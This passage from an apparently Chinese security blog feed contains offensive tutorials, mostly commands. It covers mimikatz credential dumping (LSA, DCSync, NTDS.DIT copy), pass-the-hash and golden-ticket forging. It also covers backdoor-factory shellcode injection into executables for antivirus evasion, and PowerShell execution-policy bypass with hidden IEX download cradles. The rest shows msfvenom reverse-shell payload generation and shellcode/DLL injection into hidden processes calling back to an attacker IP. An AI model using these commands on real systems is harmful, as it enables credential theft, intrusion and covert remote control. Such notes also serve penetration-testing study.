class="hljs-comment">#提升权限</span><br>privilege::debug<br>抓取密码<br>lsadump::lsa /patch<br></code></pre></td></tr></table></figure><p>方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取所有域用户</span><br>lsadump::dcsync /domain:test.com /all /csv<br><br><span class="hljs-comment">#指定获取某个用户的hash</span><br>lsadump::dcsync /domain:test.com /user:<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><ul><li><strong>导出域成员Hash</strong><br>域账户的用户名和hash密码以域数据库的形式存放在域控制器的%SystemRoot%\ntds\NTDS.DIT文件中。<br>这里可以借助: ntdsutil.exe,域控制器自带的域数据库管理工具，我们可以通过域数据库，提取域种所有的域用户信息，在域控上执行如下命令，导入域数据库。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建快照</span><br>ntdsutil snapshot <span class="hljs-string">&quot;activate instance ntds&quot;</span> create quit quit<br><br><span class="hljs-comment">#加载快照</span><br>ntdsutil snapshot <span class="hljs-string">&quot;mount &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot;</span> quit quit<br><br><span class="hljs-comment">#Copy文件副本</span><br>copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit<br></code></pre></td></tr></table></figure><ul><li><strong>哈希传递攻击</strong><br>当我们获得了一台主机得NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用administrator用户的NTLM哈希值进行攻击</span><br>sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用xie用户的NTLM哈希值进行攻击</span><br>sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9<br></code></pre></td></tr></table></figure><p><strong>- 域环境</strong><br>在域环境中，当我们获取得了域内用户得HTML哈希值，我们可以使用域内得一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机得本地administrator权限和获得了域内用户得NTLM哈希值<br>域：xie.com<br>域控：WIN2008.xie.com</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击</span><br>sekurlsa::pth /user:administrator /domain:<span class="hljs-string">&quot;xie.com&quot;</span> /ntlm:dbd621b8ed24eb627d32514476fac6c5 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击</span><br>sekurlsa::pth /user:xie /domain:<span class="hljs-string">&quot;xie.com&quot;</span> /ntlm:329153f560eb329c0e1deea55e88a1e9   <br></code></pre></td></tr></table></figure><h2 id="票据传递攻击PPT"><a href="#票据传递攻击PPT" class="headerlink" title="票据传递攻击PPT"></a>票据传递攻击PPT</h2><p><strong>- 黄金票据</strong><br>域内每个用户得ticket都是由krbtgt的密码hash来计算生成的，因此只要获取到了krbtgt用户的密码Hash，就可以随意伪造Ticket,进而使用Ticket登录域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket,此类攻击方法被称为票据传递攻击。<br>首先获取krbtgt的用户hash:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;lsadump::dcsync /domain:xx.com /user:krbtgt&quot;</span><br></code></pre></td></tr></table></figure><p>利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#导入刚才生成的票据</span><br>kerberos::ptt test.kiribi<br><br><span class="hljs-comment">#导入成功后可获取域管权限</span><br><span class="hljs-built_in">dir</span> \\dc.abc.com\c$<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>mimikatz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>backdoor-factory工具使用</title>
    <link href="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/"/>
    <url>/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>backdoor-factory是一款后门构建工具。与其他工具不同的是，他不会增加软件的大小，而是利用代码缝隙进行注入，免杀效果更好。<br>项目地址： <a href="https://github.com/secretsquirrel/the-backdoor-factory.git">https://github.com/secretsquirrel/the-backdoor-factory.git</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里我在ubuntu的机子上安全，这里选择安装的机制最好内置的是Python2.7的环境不然要出问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html<br>git <span class="hljs-built_in">clone</span> https://github.com/secretsquirrel/the-backdoor-factory.git<br>sudo pip install capstone<br></code></pre></td></tr></table></figure><p>下载好后进入目录<img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213516534.png" alt="image-20240107213516534"><br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213528806.png" alt="image-20240107213528806"><br>安装成功</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>backdoor-factory常用命令<br>-h                  查看帮助信息</p><p>-f                   测试指定文件</p><p>-S                  检查软件是否支持patch</p><p>-s                   指定payload，可以通过”show”来查看</p><p>-H                  指定回连的IP地址</p><p>-P                  指定回连的端口</p><p>-J                   使用多个代码缝隙注入</p><p>-c                   查看软件的代码缝隙</p><p>-l   num          和” -c” 一起使用,查看大于num的缝隙</p><p>-o                   指定输出软件的名称<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213544107.png" alt="image-20240107213544107"><br>可以看到是支持patch的，可以继续<br>接下来插shellcode<br>先查看可用的payload         -s show<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213554760.png" alt="image-20240107213554760"><br>这里我选择   iat_reverse_tcp_stager_threaded<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213606598.png" alt="image-20240107213606598"><br>回车执行后，我们可以看到以下界面。这里要求我们选择 code cave ，提示我们要注入到那个区段，这里我就选择2注入到rsrc区段。<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213616302.png" alt="image-20240107213616302"><br>生成成功。接下来在kali的msf中设置监听<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213633407.png" alt="image-20240107213633407"><br>设置成功，运行，并将生成的exe文件扔到目标机中<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213644016.png" alt="image-20240107213644016"><br>将文件扔进靶机并运行<br><img src="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/image-20240107213657520.png" alt="image-20240107213657520"><br>成功拿到shell</p><p>这里只是我写的一个简单的笔记，想更深入了解的可以自行摸索，有错误还望指正</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>backdoor-factor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>powershell基础知识</title>
    <link href="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>一旦攻击者可以在一台计算机上运行代码，就会下载powershell脚本文件(.ps1)到磁盘中 执行，甚至无需写到磁盘中执行，它可以直接在内存中运行，利用诸多特点攻击者可以持续攻击而不被轻易发现。</p><h4 id="常用的powershell攻击工具有以下几种："><a href="#常用的powershell攻击工具有以下几种：" class="headerlink" title="常用的powershell攻击工具有以下几种："></a>常用的powershell攻击工具有以下几种：</h4><ul><li><p>powerSploit:</p><p>常用于信息探测，权限提升，凭证窃取，持久化等操作</p></li><li><p>Nishang:</p><p>基于powershell的渗透测试专用工具，集成了框架，脚本和各种payload，包含下载和执行，键盘记录，DNS，延时命令等脚本</p></li><li><p>Empire:<br>基于powershell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块，信息探测，凭证窃取，持久化控制。</p></li><li><p>powercat:<br>powershell版的Netcat,有着网络工具中的瑞士军刀美誉，他能通过tcp和udp在网络中读写数据，通过它和其他工具结合和重定向，读者可以在脚本中以多种方式使用它。</p></li></ul><h4 id="powershell优点："><a href="#powershell优点：" class="headerlink" title="powershell优点："></a>powershell优点：</h4><ul><li>windows7中默认安装了</li><li>powershell脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载powershell脚本并执行</li><li>目前很多工具都是基于powershell开发的</li><li>很多安全软件并不能检测到powershell的活动</li><li>cmd.exe通常会被阻止运行，但powershell不会</li><li>可以用来管理活动目录</li></ul><h5 id="查看版本：Get-Host"><a href="#查看版本：Get-Host" class="headerlink" title="查看版本：Get-Host"></a>查看版本：Get-Host</h5><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173626585.png" alt="image-20240107173626585"></p><h2 id="powershell的基本概念"><a href="#powershell的基本概念" class="headerlink" title="powershell的基本概念"></a>powershell的基本概念</h2><p>一个powershell脚本其实就是一个简单的文本文件，这个文件包含了一系列powershell命令，每个命令显示为独立的一行，对于被视为powershell脚本的文本文件，他的文件名需要加上.PS1的扩展名</p><h4 id="执行策略："><a href="#执行策略：" class="headerlink" title="执行策略："></a>执行策略：</h4><p>为防止恶意脚本的执行，powershell有一个执行策略，默认情况下，这个执行策略被设置为受限</p><p>在powershell脚本无法执行时，可以使用下面的cmdlet命令来确定当前的执行策略</p><h5 id="Get-ExecutionPolicy："><a href="#Get-ExecutionPolicy：" class="headerlink" title="Get-ExecutionPolicy："></a>Get-ExecutionPolicy：</h5><ul><li><p>Restricted:脚本不能执行(默认设置)<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173635035.png" alt="image-20240107173635035"></p></li><li><p>RemoteSigned</p><p>本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)</p></li><li><p>AllSigned</p><p>仅当脚本由受信任的发布者签名时才能运行</p></li><li><p>Unrestricted</p><p>允许所有的script运行</p></li></ul><h5 id="设置执行策略：-必须为管理员权限"><a href="#设置执行策略：-必须为管理员权限" class="headerlink" title="设置执行策略：(必须为管理员权限)"></a>设置执行策略：(必须为管理员权限)</h5><p>  Set-ExecutionPolicy  &lt; policy name &gt;<br>  <img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173653620.png" alt="image-20240107173653620"></p><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173701311.png" alt="image-20240107173701311"></p><p>在限制了Powershell不能使用时可以使用此方式进行设置允许执行Powershell脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ExecutionPolicy</span> Unrestricted<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240108104245278.png" alt="image-20240108104245278"></p><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><p>运行一个脚本，必须键入完整的路劲和文件名，例如，你要运行一个名为a.ps1的脚本，可以键入c:\script\a.ps1</p><h4 id="管道："><a href="#管道：" class="headerlink" title="管道："></a>管道：</h4><p>管道的作用就是将一个命令的输出作为另一个命令的输入，两个命令之间用管道符号(|)连接</p><p>例如：</p><p>假设停止所有目前运行中的，以”p”字符开头命名的程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pow">get-process p* | stop-process<br></code></pre></td></tr></table></figure><h2 id="powershell的常用命令："><a href="#powershell的常用命令：" class="headerlink" title="powershell的常用命令："></a>powershell的常用命令：</h2><h4 id="基础："><a href="#基础：" class="headerlink" title="基础："></a>基础：</h4><p>在powershell下，类似“cmd命令”叫做”cmdlet”</p><ul><li><p>新建目录&#x2F;文件</p><p>New-Item</p></li></ul><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173717859.png" alt="image-20240107173717859"></p><ul><li>新建文件：<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173725148.png" alt="image-20240107173725148"></li><li>删除目录</li></ul><p>Remove-Item<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173731525.png" alt="image-20240107173731525"></p><ul><li>显示文件内容</li></ul><p>Get-Content<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173738344.png" alt="image-20240107173738344"></p><ul><li>设置文件内容</li></ul><p>Set-Content<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173746647.png" alt="image-20240107173746647"></p><ul><li>追加内容</li></ul><p>Add-Content<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173753754.png" alt="image-20240107173753754"></p><ul><li>清除内容</li></ul><p>Clear-Content<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173801169.png" alt="image-20240107173801169"></p><h4 id="常用的命令："><a href="#常用的命令：" class="headerlink" title="常用的命令："></a>常用的命令：</h4><p>如果要运行powershell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted,所以在渗透时，就需要采用一些方法绕过策略来执行脚本</p><ul><li><p>绕过本地权限执行</p><p>上传xxx.ps1至目标服务器，在cmd环境下，在目标服务器本地执行该脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">PowerShell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass  <span class="hljs-operator">-File</span>  xxx.ps1<br></code></pre></td></tr></table></figure></li><li><p>本地隐藏绕过权限执行脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">PowerShell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass  <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span>  <span class="hljs-literal">-NoLogo</span>   <span class="hljs-literal">-Nonlnteractive</span>   <span class="hljs-literal">-NoProfile</span> <span class="hljs-operator">-File</span>   xxx.ps1<br></code></pre></td></tr></table></figure></li><li><p>用IEX下载远程PS1脚本绕过权限执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">PowerShell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass  <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span><span class="hljs-literal">-NoProfile-NonIIEX</span>(New-ObjectNet.WebClient).DownloadString(<span class="hljs-string">&quot;xxx.ps1&quot;</span>);[<span class="hljs-type">Parameters</span>]<br></code></pre></td></tr></table></figure></li></ul><h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><ul><li><p>-ExecutionPolicy Bypass </p><p>绕过执行安装策略，这个参数非常重要，在默认情况下，Powershell的安全策略规定了Powershell不允许运行命令和文件。通过设置这个参数，可以绕过一些安全保护规则，在渗透测试中，基本每一次运行powershell脚本都要使用这个参数</p></li><li><p>-WindowStyle Hidden </p><p>隐藏窗口</p></li><li><p>-NoLogo</p><p>启动不显示版权标志的Powershell</p></li><li><p>-Nonlnteractive( -Nonl)</p><p>非交互模式，powershell不为用户提供交互的提示</p></li><li><p>-NoProfile(-Nop)</p><p>powershell控制台不加载当前用户的配置文件</p></li><li><p>-Noexit</p><p>执行后不退出shell</p></li></ul><h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>‘“ test”‘&gt;t.ps1</p><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173820999.png" alt="image-20240107173820999"></p><h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit:"></a>PowerSploit:</h4><p>PowerSploit是一款基于Powershell的后渗透（post-Exploitation)框架软件，包含很多powershell攻击脚本，它们主要用户渗透中的信息侦察，权限提升，权限维持：</p><p>地址:    <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><h5 id="模块功能介绍："><a href="#模块功能介绍：" class="headerlink" title="模块功能介绍："></a>模块功能介绍：</h5><ul><li><p>AntivirusBypass</p><p>发现杀毒软件的查杀特征</p></li><li><p>CodeExecution</p><p>在目标主机上执行代码</p></li><li><p>Exfiltration</p><p>在目标主机上的信息收集工具</p></li><li><p>Mayhem</p><p>蓝屏等破坏性脚本</p></li><li><p>Persistence</p><p>后门脚本(持久性控制)</p></li><li><p>Recon</p><p>以目标主机为跳板进行内网信息侦察</p></li><li><p>ScriptModification</p><p>在目标主机上创建或修改脚本</p></li></ul><h2 id="PowershellSploit脚本攻击实战"><a href="#PowershellSploit脚本攻击实战" class="headerlink" title="PowershellSploit脚本攻击实战"></a>PowershellSploit脚本攻击实战</h2><p>攻击机为kali并且安装了powershellsploit</p><ul><li><h3 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h3>CodeExecution模块下的Invoke-Shellcode脚本常用于将shellcode插入指定的进程ID或本地Powershell中</li></ul><h4 id="直接执行shellcoe反弹meterpreter-shell"><a href="#直接执行shellcoe反弹meterpreter-shell" class="headerlink" title="直接执行shellcoe反弹meterpreter  shell"></a>直接执行shellcoe反弹meterpreter  shell</h4><ol><li><p>首先在msf中使用reverse_https模块进行反弹(监听)</p><pre><code class="hljs">   2.使用msfvenom命令生成一个Powershell脚本木马</code></pre></li></ol>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">msfvenom <span class="hljs-literal">-p</span> windows/meterpreter/reverse_https  LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">31.247</span>  LPORT=<span class="hljs-number">4444</span>  <span class="hljs-operator">-f</span> powershell  <span class="hljs-literal">-o</span> /var/www/html/test<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">3</span>.接着在目标主机Powershell下输入以下命令下载该脚本(下载 <span class="hljs-built_in">invoke-shellcode</span>)<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span>  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">4</span>.接着在目标主机上下载生成的木马<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span>  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">5</span>.在powershell中运行木马<br></code></pre></td></tr></table></figure>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Shellcode -Shellcode  （<span class="hljs-variable">$buf</span>） -Force<br></code></pre></td></tr></table></figure>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-literal">-Force</span>   意思是不用提示直接运行<br></code></pre></td></tr></table></figure><p>  ​</p><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173830056.png" alt="image-20240107173830056"><br>反弹回shell<br><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173839022.png" alt="image-20240107173839022"></p><p>  可以在msf中看到反弹shell成功</p><h4 id="指定进程注入shellcode反弹meterpreter-shell"><a href="#指定进程注入shellcode反弹meterpreter-shell" class="headerlink" title="指定进程注入shellcode反弹meterpreter shell"></a>指定进程注入shellcode反弹meterpreter shell</h4><pre><code class="hljs">         1.同样在目标机powershell下输入以下命令</code></pre>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">          2.接着Get-Process命令或者PS命令查看当前进程              ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210430170657943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70)</code></pre><p>3.创建一个新进程，这里启动一个记事本，并把它设置为隐藏的，在输入Get-Process命令查看进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240107173850897.png" alt="image-20240107173850897"></p><ul><li><p>4.接着输入命令，使用Invoke-Shellcode脚本进行注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Shellcode  -ProcessID  8120 -Shellcode(<span class="hljs-variable">$buf</span>)  -Force<br></code></pre></td></tr></table></figure><p>完成成功获取shell</p><ul><li><h3 id="Invoke-DLLInjection"><a href="#Invoke-DLLInjection" class="headerlink" title="Invoke-DLLInjection"></a>Invoke-DLLInjection</h3><p>下面使用Code Execution模块下的另一个脚本Invoke-DLLInjection，它是一个DLL注入的脚本</p><pre><code class="hljs">1.同理还是先下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-DLLIinjection.ps1&quot;</span>)<br>IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/test&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs"> 2.在kali中生成一个DLL注入脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.247  lport=4444  -f dll -o /var/www/html/test.dll<br></code></pre></td></tr></table></figure><pre><code class="hljs">   3.把生成的test.dll上传到目标服务器的C盘后，就能启动一个新的进程进行DLL注入，这样可以注入更加隐蔽，使用以下命令新建一个名为notepad.exe的隐藏进程</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Start-Process c:\windows\system32\notepad.exe-WindowStyle   Hidden<br></code></pre></td></tr></table></figure><pre><code class="hljs">    4.然后进行命令注入</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-DLLInjection  -ProcessID 2000 -DLL  c:\test.dll<br></code></pre></td></tr></table></figure><p>运行即可反弹shell</p></li></ul></li><li><h3 id="Invoke-Portscan"><a href="#Invoke-Portscan" class="headerlink" title="Invoke-Portscan"></a>Invoke-Portscan</h3><p>Invoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来比较简单。</p><pre><code class="hljs">                1.同样先使用以下命令下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Portscan.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">                2.使用以下命令进行扫描(目标机上)</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Portscan  -Hosts 192.168.31.1.192.168.31.247 -Port <span class="hljs-string">&quot;80,22,3389&quot;</span><br></code></pre></td></tr></table></figure></li><li><h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" 